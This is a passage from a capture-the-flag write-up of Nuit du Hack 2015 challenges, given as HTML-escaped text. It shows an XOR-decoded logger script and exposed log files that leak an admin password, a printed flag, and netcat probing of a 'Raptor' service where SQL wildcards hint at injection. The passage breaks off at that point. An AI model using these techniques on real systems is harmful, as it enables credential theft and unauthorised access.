&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The first line of our file was not &lt;code&gt;import sys&lt;/code&gt; but &lt;code&gt;import datetime&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x17^ord(&amp;#39;d&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;s&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="the-logs-file"&gt;The logs file&lt;/h3&gt;
&lt;p&gt;We decipher the file with the key &lt;strong&gt;6[@dq"&amp;amp;s&lt;/strong&gt; and obtain the following file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;LOG_DIR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;logs&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Logger&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;basename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;_&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LOG_DIR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;today&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a+&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;] Login with password &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;today&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We see that the logs of the application are in a file like
&lt;code&gt;/logs/date_username/&lt;/code&gt; with the date in the format YYYY-MM-DD.&lt;/p&gt;
&lt;p&gt;We go to the URL http://updator.challs.nuitduhack.com/logs/2015-04-04_admin to
see the logs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf&lt;/span&gt;
&lt;span class="code-line"&gt;[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We now have the credentials to log ourself in the interface and get the flag.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag: zEpbiUFt5p7m84cxOxN6&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="raptor"&gt;Raptor&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Thank to &lt;a href="https://twitter.com/_plo_"&gt;Plo&lt;/a&gt; who redact this WRITUP before me.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Misc   \   400 points      http://quals.nuitduhack.com/challenges/view/12&lt;/p&gt;
&lt;h2 id="statement_4"&gt;Statement&lt;/h2&gt;
&lt;p&gt;No statement, nothing except a link: raptor.challs.nuitduhack.com:4142&lt;/p&gt;
&lt;h2 id="challenge_4"&gt;Challenge&lt;/h2&gt;
&lt;p&gt;We connect ourself to the port and the address:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;plo@hyperion Misc&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;raptor&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;challs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nuitduhack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4142&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;»&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Welcome&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Raptor&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Information&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Exchange&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;»&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;anonymous&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Read&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;only&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;access&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Available&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;commands&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+----------+-----------------+-------------------------------+--------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Command&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Required&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Access&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="n"&gt;Syntax&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="n"&gt;Help&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+----------+-----------------+-------------------------------+--------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;guest&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;Connect&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;an&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;LIST&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;LIST&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maxrecords&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;informations&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;SEARCH&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SEARCH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pattern&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maxresults&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="k"&gt;Search&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;an&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;RSHELL&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="n"&gt;RSHELL&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Migrate&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Raptor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Shell&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VERSION&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;guest&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;VERSION&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Show&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;current&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Raptor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;REGISTER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;guest&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;REGISTER&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;Register&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;HELP&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;guest&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;VERSION&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;Show&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;menu&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;RIGHTS&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;guest&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="n"&gt;RIGHTS&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="k"&gt;Print&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;your&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;current&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rights&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HISTORY&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;HISTORY&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;Show&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;your&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;call&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;RESET&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;guest&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="n"&gt;RESET&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ROLLBACK&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Reset&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CTF&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DB&lt;/span&gt;&lt;span class="p"&gt;.)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;QUIT&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;guest&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="n"&gt;QUIT&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;Close&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;----------+-----------------+-------------------------------+--------------------------------+&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We are connected to the Raptor service as guest.&lt;/p&gt;
&lt;p&gt;The output format seems to be a database. A SQL request could return this
output. The Raptor service got 3 level of rights: guest, user and admin and the
only command restricted to the admin right is &lt;code&gt;RSHELL&lt;/code&gt;. When continuing to
discover the commands, we notice that the &lt;code&gt;_&lt;/code&gt; and &lt;code&gt;%&lt;/code&gt; SQL wildcards characters
work directly out of the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;guest ~ $ SEARCH %&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|   Wesley  |   Eshmaggle   |    4412   | admin  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|    Yvan   |    Delacam    |    0452   |  user  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|    Yvon   |     Payrir    |     A     |  user  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|   Zlatan  | Ibrahimovitch |    5122   |  user  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;guest ~ $ SEARCH _&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|   Wesley  |   Eshmaggle   |    4412   | admin  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|    Yvan   |    Delacam    |    0452   |  user  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|    Yvon   |     Payrir    |     A     |  user  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|   Zlatan  | Ibrahimovitch |    5122   |  user  |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Moreover, the user Yvon Payrir as a DESKPHONE &lt;strong&gt;A&lt;/strong&gt;.
